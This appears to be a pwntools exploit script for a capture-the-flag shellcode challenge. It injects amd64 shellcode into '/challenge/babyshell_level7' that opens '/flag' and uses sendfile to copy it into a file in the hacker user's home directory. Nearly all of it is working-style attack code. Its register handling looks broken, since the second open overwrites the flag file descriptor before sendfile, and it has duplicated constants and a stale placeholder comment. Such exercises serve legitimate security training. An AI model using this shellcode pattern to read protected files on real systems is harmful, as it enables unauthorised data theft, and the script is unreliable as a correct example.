from pwn import *

# Set up the context for the architecture
context.arch = 'amd64'
context.log_level='Debug'
SYS_sendfile = 40
# Shellcode to open the flag file, read its content, and write it to a file named "out" in the home directory of user "hacker"
context.arch = 'amd64'

# Define constants for syscalls
SYS_open = 2
SYS_sendfile = 40

# Shellcode to send the content of /flag to /home/hacker/out
shellcode = shellcraft.open('/flag', 0) + \
            shellcraft.mov('rdi', 'rax') + \
            shellcraft.open('/home/hacker/out', 0o0102, 0o666) + \
            shellcraft.mov('rsi', 'rax') + \
            shellcraft.linux.syscall(SYS_sendfile, 'rax', 'rsi', 0, 100)


# Execute the shellcode
p = process(['/challenge/babyshell_level7'])  # Replace './your_binary' with the path to your binary

p.recvuntil(b'from stdin.\n')
p.send(asm(shellcode))
p.recvall()
print("[+] Flag content written to 'out' file in hacker's home directory.")
